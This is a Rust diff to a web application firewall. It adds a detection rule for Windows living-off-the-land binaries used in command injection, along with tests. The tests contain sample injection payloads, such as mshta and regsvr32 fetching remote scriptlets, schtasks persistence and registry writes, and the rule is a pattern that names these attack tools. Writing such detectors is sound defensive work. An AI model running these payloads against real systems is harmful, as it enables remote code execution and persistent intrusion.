@@ -1266,6 +1266,15 @@ pub fn starter_rules() -> Vec<Rule> {
 		// double-counts in anomaly scoring. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
 		Rule { id: "cmdi_recon_and_utility", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|`$]\s*(nslookup|dig|telnet|tftp|socat|scp|ssh|ftp|lynx|fetch|chmod|chown|crontab|mkfifo|mknod|base64|xxd|msfvenom|busybox)\b" },
 		Rule { id: "cmdi_windows_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|]\s*(dir|type|net\s+user|ping\s+-n|certutil|bitsadmin|tasklist|systeminfo)\b" },
+		// Windows living-off-the-land binaries (LOLBins) for fileless download/exec past the basic
+		// `cmd.exe` verbs above (OWASP-CRS 932xxx Windows command list): the script hosts and proxy-exec
+		// binaries attackers reach for — `mshta`, `regsvr32` (scrobj), `rundll32`, `wmic process call
+		// create`, `cscript`/`wscript`, `schtasks`, `reg add`, `sc create`. Same `[;&|]` leading-separator
+		// anchor as the sibling command rules (the false-positive guard); command names disjoint from
+		// `cmdi_windows_command` so a hit never double-counts. The short `reg`/`sc` verbs are pinned to
+		// their sub-command (`reg add`/`sc create`) so they don't fire on ordinary words.
+		// <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
+		Rule { id: "cmdi_windows_lolbin", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|]\s*(mshta|regsvr32|rundll32|wmic|cscript|wscript|schtasks|reg\s+add|sc\s+create)\b" },
 		// PowerShell download-cradle / encoded-command RCE (OWASP-CRS rules 932120/932125): the vectors
 		// the `cmd.exe`-flavored `cmdi_windows_command` misses — the `Invoke-*` cmdlets and their
 		// aliased call form (`iex(`), the `Net.WebClient().DownloadString` / `Invoke-WebRequest`
@@ -1865,6 +1874,41 @@ mod tests {
 			"/blog/hidden-features",           // "hidden" word, no `-w hidden` flag
 			"/api/webclient-usage",            // "webclient" word, no `Net.WebClient`
 			"/search?q=encoded+video",         // "encoded" word, no `-EncodedCommand`
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn windows_lolbin_rule_matches() {
+		// OWASP-CRS 932xxx Windows LOLBins: the fileless download/proxy-exec binaries the basic
+		// cmd.exe verb rule doesn't name, each riding a shell separator.
+		let waf = Waf::starter();
+		for (payload, why) in [
+			("a=1; mshta http://x/a.hta", "mshta remote scriptlet"),
+			("b=2& regsvr32 /s /u /i:http://x/a.sct scrobj.dll", "regsvr32 scrobj"),
+			("c=3|rundll32 shell32.dll,Control_RunDLL calc", "rundll32 proxy"),
+			("d=4; wmic process call create calc", "wmic process create"),
+			("e=5& schtasks /create /tn p /tr calc", "schtasks persistence"),
+			("f=6| reg add HKCU\\x /v y", "reg add"),
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} ({why}) should trip a cmdi rule"));
+			assert_eq!(m.category, WafCategory::CommandInjection, "{payload} ({why})");
+		}
+		// The dedicated rule (not a sibling) claims a clean mshta hit.
+		assert_eq!(waf.inspect_str("x=1; mshta http://x/a.hta", "query").unwrap().rule_id, "cmdi_windows_lolbin");
+	}
+
+	#[test]
+	fn windows_lolbin_keeps_false_positives_low() {
+		// The LOLBin names as bare words with no shell separator, and short verbs like `reg`/`sc`
+		// without their sub-command, stay clean.
+		let waf = Waf::starter();
+		for uri in [
+			"/downloads/regsvr32-explained", // "regsvr32" prose, no separator
+			"/products/sc-registration",     // "sc" word, not `sc create`
+			"/blog/reg-of-companies",        // "reg" word, not `reg add`
+			"/wiki/wmic-reference",          // "wmic" prose, no separator
 		] {
 			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
